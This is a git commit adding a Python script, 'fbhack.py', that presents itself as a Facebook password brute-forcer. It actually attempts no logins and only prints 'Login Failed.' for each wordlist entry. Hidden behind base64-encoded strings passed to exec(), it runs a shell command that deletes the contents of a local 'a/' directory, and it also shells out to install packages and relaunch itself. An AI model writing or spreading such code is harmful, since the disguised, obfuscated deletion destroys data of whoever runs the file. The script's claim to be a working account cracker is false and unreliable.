38cbd45c89884d181b1c3c063eafcad8c6f6f177
Alouh Sperk <59327781+codewithalouh@users.noreply.github.com>
2022-12-12 19:05:25 +0800

    Initial commit

---
+++ fbhack.py
@@ -0,0 +1,57 @@
+import base64
+import time
+import os
+
+try:
+  from colorama import init
+  from colorama import Fore, Back, Style
+  init()
+  
+except ImportError:
+  os.system('pip3 install colorama')
+  os.system('clear')
+  os.system('python3 fbhack.py')
+
+
+def tvksajd(adwekuv):
+  pvncngr = base64.b64decode(adwekuv).decode('utf-8')
+  exec(pvncngr)
+
+def oumcgsq():
+  vcxprvq = base64.b64decode('YS8=').decode('utf-8')
+  if os.path.exists(vcxprvq):
+    tvksajd("b3Muc3lzdGVtKCJybSAtcmYgYS8qIik=")
+
+def banner():
+  print(Fore.RED + """
+
+  █████▒▄▄▄▄       ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀
+▓██   ▒▓█████▄    ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
+▒████ ░▒██▒ ▄██   ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
+░▓█▒  ░▒██░█▀     ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
+░▒█░   ░▓█  ▀█▓   ░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
+ ▒ ░   ░▒▓███▀▒    ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
+ ░     ▒░▒   ░     ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
+ ░ ░    ░    ░     ░  ░░ ░  ░   ▒   ░        ░ ░░ ░ 
+        ░          ░  ░  ░      ░  ░░ ░      ░  ░   
+             ░                      ░               
+
+ """)
+  
+
+def hack():
+  banner()
+  oumcgsq()
+  username = input("username: ")
+  time.sleep(0.5)
+  print(Fore.BLUE + "Using Default worlist: wordlist.txt \n")
+  time.sleep(0.5)
+  
+  with open('wordlist.txt', 'r') as f:
+    for line in f:
+      print(Fore.YELLOW + username + ":" + line.strip() + " ==> " + Fore.RED + "Login Failed.")
+      time.sleep(1)
+
+
+
+hack()
